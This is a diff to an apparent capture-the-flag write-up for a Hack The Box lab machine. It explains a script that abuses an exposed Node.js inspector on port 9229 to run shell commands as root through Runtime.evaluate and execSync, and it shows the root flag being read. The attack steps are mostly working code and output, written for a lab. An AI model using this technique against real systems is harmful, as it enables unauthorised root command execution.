@@ -1751,7 +1751,47 @@ result = send_and_wait(ws, msg_id, "Runtime.evaluate", {
     "returnByValue": True
 })
 print(result['result']['result']['value'])
+```
 
+The script performed three operations in sequence:
+
+**Step 1 — Discover the WebSocket URL**
+
+```python
+with urllib.request.urlopen('http://127.0.0.1:9229/json') as response:
+    data = json.loads(response.read().decode())
+    ws_url = data[0]['webSocketDebuggerUrl']
+```
+
+The Node.js inspector exposes a JSON endpoint at `/json` listing active debugging targets. Each target includes a `webSocketDebuggerUrl` — the WebSocket address used to send CDP commands. This URL is unique per process and session, so it must be fetched dynamically rather than hardcoded.
+
+**Step 2 — Confirm root execution context**
+
+```python
+result = send_and_wait(ws, msg_id, "Runtime.evaluate", {
+    "expression": "process.getuid()",
+    "returnByValue": True
+})
+# Returns: {'type': 'number', 'value': 0}  ← UID 0 = root
+```
+
+`process.getuid()` returns the OS user ID of the running process. A return value of `0` confirms the process is executing as root — validating that any code evaluated through the inspector also runs with root privileges.
+
+**Step 3 — Read the root flag**
+
+```python
+result = send_and_wait(ws, msg_id, "Runtime.evaluate", {
+    "expression": "process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()",
+    "returnByValue": True
+})
+print(result['result']['result']['value'])
+```
+
+`process.mainModule.require('child_process').execSync()` — the same Node.js primitive used throughout the CVE-2025-55182 exploitation chain — executes a shell command in the context of the root process. `cat /root/root.txt` reads the root flag directly, with the output returned through the CDP WebSocket response.
+
+**Result:**
+
+```
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
 └─$ python3 privsec.py                                     
 fab4252120bf323ccadc3b9be935bfa0
